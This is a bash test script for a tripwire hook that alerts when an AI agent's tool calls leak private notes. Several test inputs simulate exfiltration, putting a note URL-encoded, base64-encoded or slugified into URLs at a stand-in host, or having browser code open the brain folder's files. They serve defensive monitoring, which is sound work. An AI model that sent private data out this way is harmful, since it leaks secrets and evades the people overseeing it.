#!/usr/bin/env bash
# Tests for exfil-tripwire.py against a fake brain and a log in place of the webhook.
# Run: bash vps/tania/test-exfil-tripwire.sh
set -u
SCRIPT=$(cd "$(dirname "$0")" && pwd)/exfil-tripwire.py
T=$(mktemp -d)
trap 'rm -rf "$T"' EXIT
pass=0 fail=0

B=$T/brain
mkdir -p "$B/notes" "$B/skills/capture" "$B/.git"
note='The staging database password rotates every ninety days and lives in the team vault only.'
echo "# Staging
$note" > "$B/notes/staging.md"
echo 'Use this skill to save a link or a decision into the brain inbox for later triage.' > "$B/skills/capture/SKILL.md"
echo 'Agents stage the work and stop before committing anything to the main branch here.' > "$B/AGENTS.md"

# call <tool> <tool_input JSON>: runs the hook, sets $out (stdout) and $alert (what it posted).
call() {
  rm -f "$T/alerts"
  out=$(printf '{"hook_event_name":"pre_tool_call","tool_name":"%s","tool_input":%s,"session_id":"s1"}' "$1" "$2" |
    TRIPWIRE_BRAIN=$B TRIPWIRE_ALERT_LOG=$T/alerts python3 -I "$SCRIPT" 2>&1)
  alert=$(cat "$T/alerts" 2>/dev/null)
}
check() { local name=$1; shift; if "$@"; then echo "ok   $name"; pass=$((pass + 1)); else echo "FAIL $name"; echo "     stdout: ${out:-<none>}"; echo "     alert: ${alert:-<none>}"; fail=$((fail + 1)); fi; }
says() { grep -qF -- "$1" <<<"$alert"; }
quiet() { [ -z "$alert" ] && [ "$out" = "{}" ]; }
b64() { printf '%s' "$1" | base64 | tr -d '\n'; }
urlenc() { python3 -I -c 'import sys, urllib.parse; print(urllib.parse.quote(sys.argv[1]))' "$1"; }

call web_search '{"query":"best hiking trails near lisbon in autumn"}'
check "an ordinary search is silent" quiet

call web_extract '{"urls":["https://example.com/docs/getting-started?lang=en"]}'
check "an ordinary page is silent" quiet

call web_search '{"query":"staging database password rotates"}'
check "a few words from a note are silent" quiet

call web_extract "{\"urls\":[\"https://collect.example/?q=$(urlenc "$note")\"]}"
check "a note in a URL, URL-encoded, posts" eval 'says "\`notes/staging.md\` (URL-encoded)" && [ "$out" = "{}" ]'

call web_extract "{\"urls\":[\"https://collect.example/$(b64 "$note")\"]}"
check "a note base64-encoded in a URL path posts" eval 'says "\`notes/staging.md\` (base64)"'

call web_extract "{\"urls\":[\"https://collect.example/?d=$(b64 "$note" | tr '+/' '-_' | tr -d =)\"]}"
check "URL-safe base64 without padding posts" eval 'says "notes/staging.md"'

call browser_exec "{\"code\":\"goto_url('https://collect.example/x?' + 'the-staging-database-password-rotates-every-ninety-days-and-lives')\"}"
check "a note as a slug inside browser code posts" eval 'says "Tania'"'"'s \`browser_exec\` call" && says "(plain)"'

call browser_exec '{"code":"t = open(\"~/brain/notes/x.md\").read()"}'
check "browser code naming the brain folder posts" eval 'says "the brain'"'"'s folder"'

call browser_exec "{\"code\":\"open('$B/notes/staging.md')\"}"
check "the real brain path is caught too" eval 'says "the brain'"'"'s folder"'

call web_search '{"query":"save a link or a decision into the brain inbox for later triage"}'
check "skill text is public: silent" quiet

call web_search '{"query":"agents stage the work and stop before committing anything to the main"}'
check "AGENTS.md is public: silent" quiet

call web_extract "{\"urls\":[\"https://x.example/\`@everyone\`\"],\"q\":\"$note\"}"
check "the arguments are never repeated in the alert" eval '! says "ninety" && ! says "x.example"'

rm -rf "$B.bak"; mv "$B" "$B.bak"; mkdir "$B"; echo '{"broken' > "$T/bad"
out=$(TRIPWIRE_BRAIN=$B TRIPWIRE_ALERT_LOG=$T/alerts python3 -I "$SCRIPT" < "$T/bad" 2>&1); alert=$(cat "$T/alerts")
check "a broken payload says so and lets the call go" eval 'says "exfil-tripwire failed" && [ "$out" = "{}" ]'
rm -rf "$B"; mv "$B.bak" "$B"

rm -f "$T/alerts"
out=$(printf '{"tool_name":"web_search","args":{"query":"%s"}}' "$note" |
  TRIPWIRE_BRAIN=$B TRIPWIRE_ALERT_LOG=$T/alerts python3 -I "$SCRIPT" 2>&1); alert=$(cat "$T/alerts" 2>/dev/null)
check "arguments under args (older Hermes) are read too" eval 'says "notes/staging.md"'

echo "$pass passed, $fail failed"
[ "$fail" = 0 ]
